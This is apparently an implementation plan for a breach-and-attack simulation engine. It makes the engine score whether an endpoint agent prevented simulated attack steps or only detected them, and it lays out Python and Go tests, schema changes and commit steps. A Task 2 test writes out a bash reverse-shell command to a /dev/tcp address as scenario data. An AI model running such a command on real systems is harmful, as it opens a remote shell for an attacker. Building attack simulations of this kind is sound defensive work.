# Prevention Efficacy — Phase 1 Engine Contract Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make a block-mode run representable end to end — the beacon reports why each step ended, the matcher reads the alert's `action`, a Result carries an outcome, the verdict needs two witnesses, and the readout shows the severed chain and the report→block delta — without a single new claim the engine cannot evidence.

**Architecture:** One pure module (`core/engine/outcome.py`) owns every vocabulary and every verdict rule, and everything else — the beacon wire, the `/complete` handler, the matcher, the reconcile service, the graph, the report — calls into it. Host evidence (per-step termination) lands on a new `step_outcomes` table; tenant evidence (the raw alert) lands on a new `observations` table; the `Result` row joins the two into `outcome`. Operator-declared launch context lives on `Run`, rendered everywhere as attested, never as verified.

**Tech Stack:** Python 3.11 / FastAPI / async SQLAlchemy (SQLite) / pytest; Go 1.21 stdlib beacon; React + vitest console; Tier-D docker harness for the end-to-end kill proof.

**Spec:** `docs/superpowers/specs/2026-10-26-prevention-detection-efficacy-design.md` — §5 in full, plus the minimal §4.2 acceptance (the seventh `type: Prevention`, `outcome` on an expected detection, the card object kind) that the engine contract cannot be proven without. `evidence_class`, `eal_plugin`, lint codes, catalog regeneration, coverage grouping by axis, and the report's `## Evidence Classes` section stay Phase 2.

## Global Constraints

- **No write path to Cortex.** `CORTEXSIM_XSIAM_ALLOW_WRITE` / `CORTEXSIM_XSIAM_ALLOW_DESTRUCTIVE` stay default-off; nothing in this plan switches an agent profile.
- **Process death alone is never `prevented`.** Confirmed prevention = alert `action_pretty` prefixed `Prevented` **and** host termination ∈ {`signaled`, `anchor_terminated`}. One witness → `pending` with a stated reason.
- **An unknown alert action can never satisfy a `prevent` expectation.** It may satisfy a `detect` one.
- **`not_reached` and `not_executed` leave every denominator** (coverage %, accuracy KPI, MTTD) and get their own report lines.
- **A silent Analytics/ABIOC row on a tenant with `soakless_attested != true` is `pending`, never a miss**; a second-run silence of a detection the first run observed is `pending` (`DEDUP_WINDOW`).
- **Unrecognised shapes raise; a zero is degraded, not ok.** An unknown `termination` value on the wire is a 422, not a silent default.
- **Old beacons stay byte-identical.** A `/complete` without `steps[]` and a task without `required_binaries` behave exactly as today.
- **Pull mode only.** Push bundles are untouched.
- **OS-agnostic structure, Linux proof.** Windows compiles (`make test-agent-cross` green) and reports `termination: exited`; it is not proven here.
- **Commit discipline:** stage by name, one commit per task, subject ≤72 chars imperative, trailer `Co-Authored-By: Claude Mythos 5.1 <noreply@anthropic.com>`. No PR unless asked.
- **Tests run with the repo's own conventions:** `.venv/bin/pytest tests/<path> -v` from the worktree root for Python; `cd agent && go test ./... -race -count=1` for Go; `cd ui && npx vitest run <file>` for the console.

## Review Focus

1. A step that runs `exit 137` by itself (a forged host witness) with no `Prevented` alert → `pending` / `PREVENTION_UNCONFIRMED_NO_ALERT`, never `prevented`. Pinned in Task 1.
2. An `action_pretty` with odd casing or whitespace (`"  prevented (Blocked) "`) still classifies `prevented`; an empty string or `None` classifies `unknown`. Pinned in Task 1.
3. A run attested `report` whose matched alert says `Prevented` → outcome `detected`, reason `ATTESTATION_CONTRADICTED` (the profile was not what the operator said). Pinned in Task 10.
4. A pair whose first run ended `aborted` or is still `running` → launch refused `PAIR_INVALID`, no Run row seeded. Pinned in Task 4.
5. The beacon-lost sweep must not terminalise a run whose agent reconnected before the threshold, and must terminalise one whose agent is still offline after it. Pinned in Task 12.

---

### Task 1: The outcome vocabulary and verdict rules (pure)

**Files:**
- Create: `core/engine/outcome.py`
- Test: `tests/engine/test_outcome.py`

**Interfaces:**
- Produces (module constants): `TERMINATION_EXITED="exited"`, `TERMINATION_SIGNALED="signaled"`, `TERMINATION_ANCHOR_TERMINATED="anchor_terminated"`, `TERMINATION_BEACON_LOST="beacon_lost"`, `TERMINATION_TIMEOUT="timeout"`, `TERMINATION_ABORTED="aborted"`, `TERMINATION_NOT_RUN="not_run"`, `TERMINATIONS: frozenset[str]` of the seven; `HOST_WITNESS: frozenset = {signaled, anchor_terminated}`.
- Produces: `OUTCOME_PREVENTED="prevented"`, `OUTCOME_DETECTED="detected"`, `OUTCOME_MISSED="missed"`, `OUTCOME_PENDING="pending"`, `OUTCOME_NOT_REACHED="not_reached"`, `OUTCOME_NOT_EXECUTED="not_executed"`, `OUTCOMES: frozenset`; `EXCLUDED_FROM_DENOMINATOR: frozenset = {not_reached, not_executed}`.
- Produces: `ALERT_PREVENTED="prevented"`, `ALERT_DETECTED="detected"`, `ALERT_UNKNOWN="unknown"`.
- Produces reason constants (strings equal to their names): `PREVENTION_ALERT_WITHOUT_TERMINATION`, `PREVENTION_UNCONFIRMED_NO_ALERT`, `PREVENTION_UNCONFIRMED_BEACON_LOST`, `PREVENTION_ALERT_ACTION_UNKNOWN`, `DETECTED_NOT_PREVENTED`, `BLOCK_MODE_UNCONFIRMED`, `ATTESTATION_CONTRADICTED`, `ANALYTICS_ACTIVATION_PERIOD`, `DEDUP_WINDOW`, `UPSTREAM_SEVERED`, `UPSTREAM_NOT_EXECUTED`, `TOOL_ABSENT`, `TOOL_PRESENCE_UNCHECKED`.
- Produces: `PROFILE_MODES: frozenset = {"report", "block", "unknown"}`; `BLOCK_MODE_CONFIRMED="block_mode_confirmed"`, `BLOCK_MODE_UNCONFIRMED_STATUS="block_mode_unconfirmed"`, `CANARY_NOT_AVAILABLE="canary_not_available"`.
- Produces: `classify_alert_outcome(action_pretty: Optional[str], action: Optional[str]) -> str` — prefix match on a lower-cased, stripped `action_pretty` (`"prevented"` → `ALERT_PREVENTED`, `"detected"` → `ALERT_DETECTED`); falls back to raw `action` (`BLOCKED*`, `PROMPT_BLOCK` → prevented; `REPORTED`, `DETECTED*`, `POST_DETECTED`, `SCANNED`, `DOWNLOAD`, `PROMPT_ALLOW` → detected); else `ALERT_UNKNOWN`.
- Produces: `host_outcome_for_step(termination: Optional[str], reason: Optional[str]) -> Optional[str]` — `not_run`+`UPSTREAM_SEVERED` → `not_reached`; `not_run`+(`TOOL_ABSENT`|`UPSTREAM_NOT_EXECUTED`) → `not_executed`; else `None`.
- Produces: `@dataclass(frozen=True) PreventVerdict(outcome: str, kpi_verdict: Optional[str], reason: Optional[str])` and `evaluate_prevent(*, agent_profile_mode: str, alert_outcome: Optional[str], termination: Optional[str], window_closed: bool, block_mode_status: Optional[str]) -> PreventVerdict` implementing spec §5.3's table, with: report mode → `detect` semantics (any alert → `detected`, `kpi_verdict=None`; `Prevented` alert → reason `ATTESTATION_CONTRADICTED`); `alert_outcome == "unknown"` treated as no alert with reason `PREVENTION_ALERT_ACTION_UNKNOWN` when a host witness exists; a would-be `fail` under `block_mode_status == "block_mode_unconfirmed"` becomes `pending` / `BLOCK_MODE_UNCONFIRMED`.
- Produces: `soak_pending_reason(*, signal_type: str, soakless_attested: Optional[bool], first_run_observed: bool) -> Optional[str]` — only for `signal_type ∈ {"Analytics", "ABIOC"}`; `first_run_observed` → `DEDUP_WINDOW`; else `soakless_attested is not True` → `ANALYTICS_ACTIVATION_PERIOD`; else `None`.

- [ ] **Step 1: Write the failing tests**

```python
# tests/engine/test_outcome.py
from engine import outcome as oc

def test_classify_prefers_pretty_prefix_case_insensitive():
    assert oc.classify_alert_outcome("  prevented (Blocked) ", None) == oc.ALERT_PREVENTED
    assert oc.classify_alert_outcome("Detected (Reported)", "BLOCKED") == oc.ALERT_DETECTED

def test_classify_falls_back_to_raw_action():
    assert oc.classify_alert_outcome(None, "BLOCKED_14") == oc.ALERT_PREVENTED
    assert oc.classify_alert_outcome(None, "PROMPT_ALLOW") == oc.ALERT_DETECTED
    assert oc.classify_alert_outcome("", None) == oc.ALERT_UNKNOWN
    assert oc.classify_alert_outcome(None, "NOT_AVAILABLE") == oc.ALERT_UNKNOWN

def test_prevent_needs_both_witnesses():
    v = oc.evaluate_prevent(agent_profile_mode="block", alert_outcome="prevented",
                            termination="anchor_terminated", window_closed=False, block_mode_status=None)
    assert (v.outcome, v.kpi_verdict, v.reason) == ("prevented", "pass", None)
    v = oc.evaluate_prevent(agent_profile_mode="block", alert_outcome="prevented",
                            termination="exited", window_closed=False, block_mode_status=None)
    assert (v.outcome, v.kpi_verdict, v.reason) == ("pending", "pending", oc.PREVENTION_ALERT_WITHOUT_TERMINATION)

def test_forged_host_death_without_alert_is_pending_never_pass():   # Review Focus 1
    v = oc.evaluate_prevent(agent_profile_mode="block", alert_outcome=None,
                            termination="signaled", window_closed=True, block_mode_status=None)
    assert (v.outcome, v.kpi_verdict, v.reason) == ("pending", "pending", oc.PREVENTION_UNCONFIRMED_NO_ALERT)

def test_detected_not_prevented_fails_but_unconfirmed_canary_downgrades_to_pending():
    v = oc.evaluate_prevent(agent_profile_mode="block", alert_outcome="detected",
                            termination="exited", window_closed=False, block_mode_status=None)
    assert (v.outcome, v.kpi_verdict, v.reason) == ("detected", "fail", oc.DETECTED_NOT_PREVENTED)
    v = oc.evaluate_prevent(agent_profile_mode="block", alert_outcome="detected",
                            termination="exited", window_closed=False, block_mode_status="block_mode_unconfirmed")
    assert (v.outcome, v.kpi_verdict, v.reason) == ("pending", "pending", oc.BLOCK_MODE_UNCONFIRMED)

def test_missed_only_when_window_closed_and_nothing_fired():
    v = oc.evaluate_prevent(agent_profile_mode="block", alert_outcome=None,
                            termination="exited", window_closed=True, block_mode_status=None)
    assert (v.outcome, v.kpi_verdict) == ("missed", "fail")
    v = oc.evaluate_prevent(agent_profile_mode="block", alert_outcome=None,
                            termination="exited", window_closed=False, block_mode_status=None)
    assert (v.outcome, v.kpi_verdict, v.reason) == ("pending", "pending", None)

def test_beacon_lost_and_unknown_action_cap_at_pending():
    v = oc.evaluate_prevent(agent_profile_mode="block", alert_outcome="prevented",
                            termination="beacon_lost", window_closed=False, block_mode_status=None)
    assert v.reason == oc.PREVENTION_UNCONFIRMED_BEACON_LOST and v.kpi_verdict == "pending"
    v = oc.evaluate_prevent(agent_profile_mode="block", alert_outcome="unknown",
                            termination="signaled", window_closed=False, block_mode_status=None)
    assert v.reason == oc.PREVENTION_ALERT_ACTION_UNKNOWN and v.outcome == "pending"

def test_report_mode_scores_prevent_as_detect_and_flags_contradiction():
    v = oc.evaluate_prevent(agent_profile_mode="report", alert_outcome="detected",
                            termination="exited", window_closed=False, block_mode_status=None)
    assert (v.outcome, v.kpi_verdict, v.reason) == ("detected", None, None)
    v = oc.evaluate_prevent(agent_profile_mode="report", alert_outcome="prevented",
                            termination="signaled", window_closed=False, block_mode_status=None)
    assert (v.outcome, v.reason) == ("detected", oc.ATTESTATION_CONTRADICTED)

def test_host_outcomes_and_soak_reasons():
    assert oc.host_outcome_for_step("not_run", oc.UPSTREAM_SEVERED) == "not_reached"
    assert oc.host_outcome_for_step("not_run", oc.TOOL_ABSENT) == "not_executed"
    assert oc.host_outcome_for_step("exited", None) is None
    assert oc.soak_pending_reason(signal_type="ABIOC", soakless_attested=None, first_run_observed=False) == oc.ANALYTICS_ACTIVATION_PERIOD
    assert oc.soak_pending_reason(signal_type="Analytics", soakless_attested=False, first_run_observed=True) == oc.DEDUP_WINDOW
    assert oc.soak_pending_reason(signal_type="Analytics", soakless_attested=True, first_run_observed=False) is None
    assert oc.soak_pending_reason(signal_type="BIOC", soakless_attested=None, first_run_observed=False) is None
```

- [ ] **Step 2: Run the tests to verify they fail**

Run: `.venv/bin/pytest tests/engine/test_outcome.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'engine.outcome'`

- [ ] **Step 3: Implement `core/engine/outcome.py`** with the constants and the four functions exactly as the Interfaces block names them. No I/O, no imports from `models` or `connectors`.

- [ ] **Step 4: Run the tests to verify they pass**

Run: `.venv/bin/pytest tests/engine/test_outcome.py -v`
Expected: PASS (9 tests)

- [ ] **Step 5: Commit**

```bash
git add core/engine/outcome.py tests/engine/test_outcome.py
git commit -m "feat(engine): outcome vocabulary and two-witness prevention rules"
```

---

### Task 2: `type: Prevention`, `outcome` on an expected detection, and the card object kind

**Files:**
- Modify: `core/engine/scenario_loader.py:49-51` (`DETECTION_TYPES`), `:136-162` (`StepExpectedDetection`), `scenarios/_schema.yml` (the `type:` comment at line ~196 and a new `outcome:` comment)
- Modify: `core/engine/ttp_catalog.py:39-54` (`DetectionCard`), `:398-520` (parser family), the place the parsers are called (grep `_parse_abioc_list(` in the same file)
- Modify: `detection_scanner/scripts/validate.py:508-516` (sibling of the `abiocs` loop), the card JSON schema under `detection_scanner/schema/` (the file that lists `abiocs`)
- Modify: `detection_scanner/scripts/coverage_report.py` (the type bucket list; the ABIOC+Analytics share's denominator)
- Create: `tests/fixtures/cards/TTP-TEST-PREV-001.json`, `tests/fixtures/scenarios/sim-test-prev-001.yml`
- Test: `tests/engine/test_scenario_loader_prevention.py`, `tests/engine/test_ttp_catalog_prevention.py`, extend `tests/engine/test_ttp_catalog.py` (the GAP-4 guard) to cover `prevention-*` slugs

**Interfaces:**
- Produces: `DETECTION_TYPES` gains `"Prevention"`; `PREVENTION_MODULES: frozenset = {"btp","exploit_protection","local_analysis","wildfire","anti_ransomware","credential_protection","device_control","host_firewall"}` in `scenario_loader.py`.
- Produces: `StepExpectedDetection.outcome: str = "detect"` (`"detect" | "prevent"`), validated: `outcome == "prevent"` requires `type == "Prevention"` and `plane ∈ {"EDR","CDR"}`; `detection_id` must start with `prevention-` when `type == "Prevention"`.
- Produces: `StepSchema` model-validator `_validate_prevent_step`: a step with any `outcome: prevent` expectation whose `command` matches `r"\|\|\s*(true|echo\b)|;\s*true\s*$|2>/dev/null\s*\|\|"` raises `ValueError("S-21: a step carrying a prevent expectation may not mask its exit")`.
- Produces: `DetectionCard.module: Optional[str] = None`, `DetectionCard.platforms: list[str] = []`; `_parse_prevention_list(ttp_ref, items) -> list[DetectionCard]` with `kind="prevention"`, `detection_id = item.get("detection_id") or _slug(name, "prevention")`, `logic = item.get("alert_name_pattern")`, `module = item["module"]`.
- Produces: validator rejects (not warns) a `prevention_modules[]` entry whose `module` is not in the eight, whose `name` is empty or matches `(?i)\b(tbd|todo|placeholder)\b`, or whose `platforms` is empty.
- Produces: `coverage_report.py` counts a `Prevention` bucket and computes the ABIOC+Analytics share over step-detections whose type is **not** `Prevention`.

- [ ] **Step 1: Write the failing loader tests**

```python
# tests/engine/test_scenario_loader_prevention.py
import pytest
from engine.scenario_loader import StepExpectedDetection, StepSchema, DETECTION_TYPES

def _det(**kw):
    base = dict(plane="EDR", type="Prevention", description="d", ttp_ref="TTP-TEST-PREV-001",
                detection_id="prevention-btp-reverse-shell-from-web-server")
    base.update(kw); return base

def test_prevention_is_a_detection_type():
    assert "Prevention" in DETECTION_TYPES

def test_prevent_requires_prevention_type_and_runtime_plane():
    StepExpectedDetection(**_det(outcome="prevent"))
    with pytest.raises(ValueError, match="outcome: prevent requires type: Prevention"):
        StepExpectedDetection(**_det(type="BIOC", detection_id="bioc-x", outcome="prevent"))
    with pytest.raises(ValueError, match="EDR or CDR"):
        StepExpectedDetection(**_det(plane="NDR", outcome="prevent"))

def test_prevention_type_with_detect_outcome_is_legal():
    d = StepExpectedDetection(**_det(outcome="detect"))
    assert d.outcome == "detect"

def test_prevention_slug_prefix_enforced():
    with pytest.raises(ValueError, match="prevention-"):
        StepExpectedDetection(**_det(detection_id="bioc-something"))

def test_prevent_step_may_not_mask_exit():
    step = dict(id="s1", name="n", identity="www-data", mitre_technique="T1059.004",
                expected_detections=[_det(outcome="prevent")])
    StepSchema(command="exec bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", **step)
    with pytest.raises(ValueError, match="S-21"):
        StepSchema(command="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 || true", **step)
```

- [ ] **Step 2: Run them to verify they fail**

Run: `.venv/bin/pytest tests/engine/test_scenario_loader_prevention.py -v`
Expected: FAIL (`"Prevention" not in DETECTION_TYPES`, then validation errors not raised)

- [ ] **Step 3: Implement the loader changes** in `scenario_loader.py` as the Interfaces block states; document `type: Prevention` and `outcome:` in `scenarios/_schema.yml` beside the existing `type:` comment.

- [ ] **Step 4: Run the loader tests to verify they pass**

Run: `.venv/bin/pytest tests/engine/test_scenario_loader_prevention.py -v`
Expected: PASS

- [ ] **Step 5: Write the failing catalog tests and the fixture card**

`tests/fixtures/cards/TTP-TEST-PREV-001.json`: a minimal card in the shape of any existing `detection_scanner/ttps/*.json`, with
`"detections": {"prevention_modules": [{"name": "BTP reverse shell from web server", "module": "btp", "platforms": ["linux","windows"], "alert_name_pattern": "Behavioral Threat*", "description": "…", "mitre_techniques": ["T1059.004"]}]}`.

```python
# tests/engine/test_ttp_catalog_prevention.py
from engine.ttp_catalog import _parse_prevention_list, _slug

def test_prevention_objects_parse_with_module_and_slug():
    cards = _parse_prevention_list("TTP-TEST-PREV-001", [{
        "name": "BTP reverse shell from web server", "module": "btp",
        "platforms": ["linux"], "alert_name_pattern": "Behavioral Threat*"}])
    c = cards[0]
    assert c.kind == "prevention" and c.module == "btp" and c.platforms == ["linux"]
    assert c.detection_id == _slug("BTP reverse shell from web server", "prevention")
    assert c.logic == "Behavioral Threat*"
```

Extend `tests/engine/test_ttp_catalog.py`'s GAP-4 guard so the fixture card is loaded by the catalog under test and `catalog.find("TTP-TEST-PREV-001", "prevention-btp-reverse-shell-from-web-server")` resolves with `kind == "prevention"`.

- [ ] **Step 6: Run them to verify they fail, implement `_parse_prevention_list` and wire it where the other parsers are called, add `module`/`platforms` to `DetectionCard` (and its `to_dict`), run again to verify they pass**

Run: `.venv/bin/pytest tests/engine/test_ttp_catalog_prevention.py tests/engine/test_ttp_catalog.py -v`
Expected: PASS

- [ ] **Step 7: Validator, schema, coverage report, export**

Add the `prevention_modules` loop to `detection_scanner/scripts/validate.py` beside the `abiocs` loop with the three rejects from the Interfaces block; add the object to the card JSON schema; add the `Prevention` bucket and the denominator rule to `coverage_report.py`. Then:

Run: `make validate`
Expected: the existing `346 pass / 0 warn / 0 fail` line unchanged (no shipped card declares `prevention_modules` yet)

Run: `make -n ci | grep -i export` to find the export regeneration + `sha256sum -c` commands; run the regeneration and the check.
Expected: `sha256sum -c` prints OK for every export (the exports gain an empty `prevention_modules` dimension only if the exporter enumerates kinds; otherwise unchanged).

- [ ] **Step 8: Run the whole engine suite**

Run: `.venv/bin/pytest tests/engine -q`
Expected: all pass; the pre-existing count plus the new tests

- [ ] **Step 9: Commit**

```bash
git add core/engine/scenario_loader.py scenarios/_schema.yml core/engine/ttp_catalog.py \
  detection_scanner/scripts/validate.py detection_scanner/schema detection_scanner/scripts/coverage_report.py \
  detection_scanner/exports tests/fixtures/cards/TTP-TEST-PREV-001.json \
  tests/engine/test_scenario_loader_prevention.py tests/engine/test_ttp_catalog_prevention.py tests/engine/test_ttp_catalog.py
git commit -m "feat(scenarios): seventh detection type Prevention with card object kind"
```

---

### Task 3: Run, Result, `step_outcomes` and `observations` schema

**Files:**
- Modify: `core/models.py:178-253` (`Run`), `:282-365` (`Result` + `to_dict`)
- Modify: `core/database.py` (new `_migrate_prevention_columns(connection)` registered where `_migrate_run_delivery_columns` is)
- Test: `tests/engine/test_models_prevention.py`

**Interfaces:**
- Produces on `Run`: `agent_profile_mode: str` (default `"unknown"`), `bas_mode_attested: Optional[bool]`, `soakless_attested: Optional[bool]`, `attested_by: Optional[str]`, `attested_at: Optional[datetime]`, `paired_with_run_id: Optional[str]` (indexed), `canary_run_id: Optional[str]`, `severed_at_step: Optional[str]`, `block_mode_status: Optional[str]`; all in `to_dict()`.
- Produces on `Result`: `expected_outcome: str` (default `"detect"`), `prevention_module: Optional[str]`, `outcome: Optional[str]`, `outcome_reason: Optional[str]`, `alert_action: Optional[str]`, `alert_outcome: Optional[str]`; all in `to_dict()`.
- Produces: `class StepOutcome(Base)` table `step_outcomes`: `id`, `run_id` (FK `runs.run_id`, indexed), `step_id`, `started_at: Optional[datetime]`, `exit_code: Optional[int]`, `termination: Optional[str]`, `signal: Optional[int]`, `reason: Optional[str]`, `recorded_at`; `UniqueConstraint(run_id, step_id)`; `to_dict()`.
- Produces: `class Observation(Base)` table `observations`: `id`, `run_id` (indexed), `result_id: Optional[int]`, `source`, `external_id`, `observed_at`, `name`, `alert_source`, `action`, `action_pretty`, `alert_outcome`, `raw: JSON`, `recorded_at`; `to_dict()`.
- Produces: `_migrate_prevention_columns(connection)` adding every new column above to `runs` / `results` when absent (tables come from `create_all`).

- [ ] **Step 1: Write the failing tests**

```python
# tests/engine/test_models_prevention.py
def test_run_and_result_carry_outcome_fields(session_factory):   # reuse tests/api/conftest.py's fixture pattern
    from models import Run, Result, StepOutcome, Observation
    ...  # insert a Run(agent_profile_mode="block", soakless_attested=True), a Result(expected_outcome="prevent"),
         # a StepOutcome(run_id, "step-02", termination="anchor_terminated", signal=9),
         # an Observation(run_id, action_pretty="Prevented (Blocked)", alert_outcome="prevented", raw={"x":1})
    assert run.to_dict()["agent_profile_mode"] == "block"
    assert result.to_dict()["expected_outcome"] == "prevent" and result.to_dict()["outcome"] is None
    assert step_outcome.to_dict()["termination"] == "anchor_terminated"
    assert observation.to_dict()["raw"] == {"x": 1}

def test_duplicate_step_outcome_is_refused(session_factory):
    # second StepOutcome(run_id, "step-02") → IntegrityError on commit
```

- [ ] **Step 2: Run to verify failure, implement the models and the migration, run to verify pass**

Run: `.venv/bin/pytest tests/engine/test_models_prevention.py tests/api/test_restart_inflight_run.py -v`
Expected: PASS (the restart test proves `create_all` + migration still boot a fresh DB)

- [ ] **Step 3: Commit**

```bash
git add core/models.py core/database.py tests/engine/test_models_prevention.py
git commit -m "feat(models): launch context, result outcome, step_outcomes and observations"
```

---

### Task 4: Launch context and run pairing

**Files:**
- Modify: `core/api/runs.py:178-208` (`LaunchRequest`), `:397-406` (the `orchestrator.launch(...)` call), `_LAUNCH_PRECONDITION_CODES`
- Modify: `core/engine/orchestrator.py:187-331` (`launch`), `:840-918` (`_seed_results`)
- Create: `core/engine/pairing.py`
- Modify: `core/api/runs.py` — new `GET /{run_id}/pair`
- Test: `tests/api/test_runs_launch_context.py`, `tests/api/test_runs_pair.py`, `tests/engine/test_pairing.py`

**Interfaces:**
- Consumes: Task 3 columns; Task 1 `PROFILE_MODES`.
- Produces: `LaunchRequest` gains `agent_profile_mode: str = "unknown"`, `bas_mode_attested: Optional[bool] = None`, `soakless_attested: Optional[bool] = None`, `attested_by: Optional[str] = None`, `paired_with_run_id: Optional[str] = None`, `canary_run_id: Optional[str] = None`; a value outside `PROFILE_MODES` is a 422.
- Produces: `orchestrator.launch(..., agent_profile_mode="unknown", bas_mode_attested=None, soakless_attested=None, attested_by=None, paired_with_run_id=None, canary_run_id=None)` persisting them on `Run` with `attested_at = now` when any attestation field is non-null.
- Produces: `pairing.validate_pair(first: Run, *, scenario_id: str, target_agent_id: Optional[str], agent_profile_mode: str) -> Optional[str]` returning an error detail string or `None`; rules: same `scenario_id`, same `target`, both modes ∈ {report, block} and different, first run `status ∈ {complete, failed}` with `completed_at` set.
- Produces: launch refuses with `error_code="PAIR_INVALID"` (409 via `_LAUNCH_PRECONDITION_CODES`) **before** the Run row is created.
- Produces: `pairing.build_pair_delta(first: dict, first_results: list[dict], second: dict, second_results: list[dict]) -> dict` → `{"report_run_id", "block_run_id", "severed_at_step", "steps": [{"step_id", "step_name", "detections": [{"detection_id", "signal_type", "prevention_module", "report": {"outcome", "mttd_seconds"}, "block": {"outcome", "outcome_reason", "mttd_seconds"}}]}]}` keyed by `(step_id, detection_id or expected_detection)`; the report-mode run is whichever has `agent_profile_mode == "report"`.
- Produces: `GET /api/runs/{run_id}/pair` → `{"runs": [a.to_dict(), b.to_dict()], "delta": build_pair_delta(...)}`; 404 `RUN_NOT_FOUND`; 409 `RUN_NOT_PAIRED` when neither `paired_with_run_id` nor a run pointing at this one exists.
- Produces: `_seed_results` sets `Result.expected_outcome = detection.get("outcome", "detect")` and `Result.prevention_module = card.module` when `card.kind == "prevention"`.

- [ ] **Step 1: Write the failing tests**

```python
# tests/engine/test_pairing.py
def test_validate_pair_rules():
    first = SimpleNamespace(scenario_id="S", target="a1", agent_profile_mode="report", status="complete", completed_at=now)
    assert validate_pair(first, scenario_id="S", target_agent_id="a1", agent_profile_mode="block") is None
    assert "same scenario" in validate_pair(first, scenario_id="T", target_agent_id="a1", agent_profile_mode="block")
    assert "terminal" in validate_pair(replace(first, status="running", completed_at=None), ...)   # Review Focus 4
    assert "terminal" in validate_pair(replace(first, status="aborted"), ...)
    assert "different" in validate_pair(first, scenario_id="S", target_agent_id="a1", agent_profile_mode="report")

def test_build_pair_delta_joins_on_step_and_detection():
    # two Result dicts per run, same (step_id, detection_id); block run has outcome="prevented", severed_at_step="step-02"
    delta = build_pair_delta(report_run, report_results, block_run, block_results)
    assert delta["severed_at_step"] == "step-02"
    d = delta["steps"][0]["detections"][0]
    assert d["report"]["outcome"] == "detected" and d["block"]["outcome"] == "prevented"
```

```python
# tests/api/test_runs_launch_context.py  (make_client + session_factory from tests/api/conftest.py)
async def test_launch_persists_attestations(...):
    # POST /api/runs {scenario_id, mode:"pull", target_agent_id, agent_profile_mode:"block",
    #                 bas_mode_attested:true, soakless_attested:true, attested_by:"henry"}
    # → 200; Run row has those values and attested_at set
async def test_launch_rejects_unknown_profile_mode(...):   # agent_profile_mode:"allow" → 422
async def test_launch_refuses_pair_with_non_terminal_first_run(...):   # 409 PAIR_INVALID, and no new Run row
```

```python
# tests/api/test_runs_pair.py
async def test_pair_endpoint_returns_both_runs_and_delta(...):
async def test_pair_endpoint_409_when_unpaired(...):
```

- [ ] **Step 2: Run to verify failure, implement, run to verify pass**

Run: `.venv/bin/pytest tests/engine/test_pairing.py tests/api/test_runs_launch_context.py tests/api/test_runs_pair.py tests/api/test_runs_api.py -v`
Expected: PASS (`test_runs_api.py` proves the default launch body is unchanged)

- [ ] **Step 3: Commit**

```bash
git add core/api/runs.py core/engine/orchestrator.py core/engine/pairing.py \
  tests/engine/test_pairing.py tests/api/test_runs_launch_context.py tests/api/test_runs_pair.py
git commit -m "feat(api): attested launch context and report→block run pairing"
```

---

### Task 5: Beacon executor reports termination cause

**Files:**
- Modify: `agent/identity/harness.go:33-39` (`ExecResult`), `ExecuteCtxStream`
- Modify: `agent/executor/shell.go:56-117` (`RunCommandCtxStream`), `agent/executor/platform_windows.go`
- Modify: `agent/executor/chained.go:200-225` (`RunStep`)
- Test: `agent/executor/shell_test.go`, `agent/executor/chained_test.go`, `agent/identity/harness_test.go`

**Interfaces:**
- Produces: `executor.Outcome{Stdout, Stderr string; ExitCode int; Termination string; Signal int}` and `executor.RunCommandCtxStreamOutcome(ctx, cmdStr, onChunk) (Outcome, error)`; `RunCommandCtxStream` becomes a thin wrapper returning the same four values it does today. `Termination` ∈ `"exited" | "signaled" | "aborted"` (the latter for the ctx-cancel path that returns 130). On Windows `Termination` is always `"exited"` and `Signal` 0.
- Produces: `identity.ExecResult` gains `Termination string` and `Signal int`, filled from the executor.
- Produces: `executor.ErrAnchorTerminated` (a sentinel `error`) returned by `ChainSession.RunStep` in place of the ad-hoc `fmt.Errorf("chain anchor shell terminated…")`, still with `rc == -1`.
- Produces: `identity.ExecResult` for a chained step is built by the client (Task 6) — this task only changes the executor and harness.

- [ ] **Step 1: Write the failing Go tests**

```go
// agent/executor/shell_test.go
func TestRunCommand_SignaledChildReportsTermination(t *testing.T) {
	if runtime.GOOS == "windows" { t.Skip("POSIX signals") }
	out, err := RunCommandCtxStreamOutcome(context.Background(), "kill -9 $$", nil)
	if err != nil { t.Fatalf("err=%v", err) }
	if out.ExitCode != 137 || out.Termination != "signaled" || out.Signal != 9 {
		t.Fatalf("got exit=%d term=%q sig=%d, want 137/signaled/9", out.ExitCode, out.Termination, out.Signal)
	}
}
func TestRunCommand_PlainExit137IsExitedNotSignaled(t *testing.T) {
	out, _ := RunCommandCtxStreamOutcome(context.Background(), "exit 137", nil)
	if out.Termination != "exited" || out.Signal != 0 { t.Fatalf("got %q/%d", out.Termination, out.Signal) }
}
// agent/executor/chained_test.go — extend TestChainSession_AnchorDiesMidStep:
	if !errors.Is(err, ErrAnchorTerminated) { t.Fatalf("want ErrAnchorTerminated, got %v", err) }
// agent/identity/harness_test.go
func TestExecuteCtxStream_CarriesTermination(t *testing.T) {  // direct identity, "kill -9 $$" → Termination "signaled", Signal 9
// One test per wrapper, each skipping with t.Skip when the wrapper binary or a
// usable target account is absent on the host — they are the "owed" tests from
// spec §5.2 and must exist even where they skip:
func TestExecuteCtxStream_RunuserSurfacesChildSignal(t *testing.T)   // runuser -l <acct> -c 'kill -9 $$' → ExitCode 137, Termination "signaled" OR "exited" with 137 — the test records which, and asserts ExitCode == 137 either way
func TestExecuteCtxStream_SudoSurfacesChildSignal(t *testing.T)
func TestExecuteCtxStream_SuSurfacesChildSignal(t *testing.T)
```

- [ ] **Step 2: Run to verify failure**

Run: `cd agent && go test ./executor/ ./identity/ -run 'Signaled|Exit137|AnchorDies|CarriesTermination' -count=1 -v`
Expected: FAIL (undefined `RunCommandCtxStreamOutcome`, `ErrAnchorTerminated`, `Termination`)

- [ ] **Step 3: Implement** — `shell.go` keeps its `status.Signaled()` branch and sets `Termination`/`Signal`; `platform_windows.go` needs no signal logic; `harness.go` copies the two fields; `chained.go` returns `ErrAnchorTerminated`.

- [ ] **Step 4: Run the executor, identity and cross-compile gates**

Run: `cd agent && go vet ./... && go test ./... -race -count=1 && cd .. && make test-agent-cross`
Expected: all PASS; cross-compile for linux/darwin/windows succeeds

- [ ] **Step 5: Commit**

```bash
git add agent/executor/shell.go agent/executor/platform_windows.go agent/executor/chained.go \
  agent/identity/harness.go agent/executor/shell_test.go agent/executor/chained_test.go agent/identity/harness_test.go
git commit -m "feat(agent): carry termination cause and signal through the executor"
```

---

